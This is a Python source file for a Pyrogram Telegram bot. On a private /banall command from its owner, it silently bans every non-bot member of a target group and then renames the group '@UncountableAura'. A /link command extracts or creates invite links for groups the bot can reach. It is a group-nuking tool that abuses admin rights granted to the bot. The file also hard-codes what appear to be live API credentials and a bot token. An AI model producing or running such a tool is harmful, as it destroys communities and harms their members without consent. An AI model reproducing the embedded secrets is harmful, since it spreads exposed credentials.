from pyrogram import Client, filters
from pyrogram.types import Message, ChatInviteLink

# Telegram API credentials
API_ID = 26416419  # Replace with your API ID
API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"  # Replace with your API hash
BOT_TOKEN = "7599525616:AAHNlIybSRF6LBhINcJ3eydIwmlXfeXdmhY"  # Replace with your bot token

app = Client("silent_ban_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

OWNER_ID = 6748827895  # Replace with your Telegram user ID (to receive logs)

# Font mapping for stylish text
FONT = {
    "A": "ᴀ", "B": "ʙ", "C": "ᴄ", "D": "ᴅ", "E": "ᴇ", "F": "ғ", "G": "ɢ", "H": "ʜ", "I": "ɪ",
    "J": "ᴊ", "K": "ᴋ", "L": "ʟ", "M": "ᴍ", "N": "ɴ", "O": "ᴏ", "P": "ᴘ", "Q": "ǫ", "R": "ʀ",
    "S": "s", "T": "ᴛ", "U": "ᴜ", "V": "ᴠ", "W": "ᴡ", "X": "x", "Y": "ʏ", "Z": "ᴢ"
}

def stylize(text):
    return "".join(FONT.get(c.upper(), c) for c in text)

@app.on_message(filters.command("banall") & filters.private & filters.user(OWNER_ID))
async def silent_ban_all(client, message: Message):
    """Starts banning users from a group when command is given in bot's DM."""
    
    # Extract chat ID from command
    try:
        chat_id = int(message.command[1])
    except (IndexError, ValueError):
        await message.reply_text("❌ Please provide a valid chat ID.\nExample: `/banall -1001234567890`")
        return

    banned_count = 0
    total_members = 0

    # Send initial log message to the owner's DM
    log_msg = await message.reply_text(f"🚀 {stylize('Starting silent ban...')}\n🔹 {stylize('Banned')}: 0")

    async for member in client.get_chat_members(chat_id):
        total_members += 1
        if member.user.is_bot or member.user.id == OWNER_ID:
            continue  # Skip bots and the owner
        
        try:
            await client.ban_chat_member(chat_id, member.user.id)
            banned_count += 1
            await log_msg.edit_text(f"🚀 {stylize('Silent banning...')}\n🔹 {stylize('Banned')}: {banned_count}/{total_members}")
        except Exception as e:
            print(f"Error banning {member.user.id}: {e}")

    # Change group name AFTER banning is done
    await client.set_chat_title(chat_id, "@UncountableAura")

    # Send final log message
    await log_msg.edit_text(f"✅ {stylize('Ban completed silently!')}\n🔹 {stylize('Total banned')}: {banned_count}")

@app.on_message(filters.command("link") & filters.private & filters.user(OWNER_ID))
async def send_group_link(client, message: Message):
    """Sends the invite link of a group when requested."""
    
    # Extract chat ID from command
    try:
        chat_id = int(message.command[1])
    except (IndexError, ValueError):
        await message.reply_text("❌ Please provide a valid chat ID.\nExample: `/link -1001234567890`")
        return

    try:
        # Try to get an existing invite link
        chat = await client.get_chat(chat_id)
        invite_link = chat.invite_link

        # If no link exists, create one
        if not invite_link:
            new_invite = await client.create_chat_invite_link(chat_id, creates_join_request=False)
            invite_link = new_invite.invite_link

        await message.reply_text(f"🔗 {stylize('Group Invite Link')}:\n{invite_link}")

    except Exception as e:
        await message.reply_text(f"❌ {stylize('Failed to get link')}\nError: {e}")

app.run()
